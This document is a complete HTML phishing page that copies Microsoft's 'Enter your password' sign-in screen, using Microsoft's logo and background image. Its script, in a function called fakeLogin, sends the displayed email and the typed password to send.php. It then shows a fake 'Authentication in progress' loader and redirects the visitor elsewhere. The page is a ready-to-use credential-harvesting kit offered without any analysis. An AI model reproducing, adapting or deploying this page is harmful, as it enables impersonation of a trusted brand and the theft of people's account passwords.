<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Password</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f6f8fb url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center center;
      background-size: cover;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background: white;
      width: 420px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      padding: 40px;
      box-sizing: border-box;
      position: relative;
    }

    .ms-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 30px;
    }

    .ms-header img {
      height: 28px;
    }

    .ms-header span {
      font-size: 20px;
      color: #222;
      font-weight: 600;
    }

    .user-email {
      background: #f3f3f3;
      padding: 8px 12px;
      font-size: 14px;
      border-radius: 20px;
      display: inline-block;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 20px;
      font-weight: normal;
      margin-bottom: 20px;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px 0;
      font-size: 16px;
      border: none;
      border-bottom: 1px solid #999;
      outline: none;
    }

    .links {
      margin-top: 10px;
      font-size: 13px;
    }

    .links a {
      color: #0067b8;
      text-decoration: none;
    }

    button {
      background-color: #0078d4;
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 15px;
      float: right;
      margin-top: 30px;
      cursor: pointer;
    }

    .loader {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 18px;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <div class="ms-header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo">
      <span>Microsoft</span>
    </div>

    <div class="user-email" id="email-display">user@example.com</div>

    <h2>Enter your password</h2>

    <input type="password" placeholder="Password" id="password" />

    <div class="links">
      <p><a href="#">Forgot your password?</a></p>
      <p><a href="#">Sign in with a different Microsoft account</a></p>
    </div>

    <button onclick="fakeLogin()">Next</button>
    <div class="loader" id="loader">Authentication in progress...</div>
  </div>

  <script>
    const email = localStorage.getItem("login_email") || "user@example.com";
    document.getElementById("email-display").innerText = email;

    function fakeLogin() {
      const pw = document.getElementById("password").value.trim();
      if (!pw) {
        alert("Please enter your password.");
        return;
      }

      document.getElementById("loader").style.display = "flex";

      fetch('send.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}`
      }).then(() => {
        setTimeout(() => {
          window.location.href = "https://home.com";
        }, 2000); // fake loader for 2s
      }).catch(() => {
        alert("An error occurred.");
        document.getElementById("loader").style.display = "none";
      });
    }
  </script>

</body>
</html>
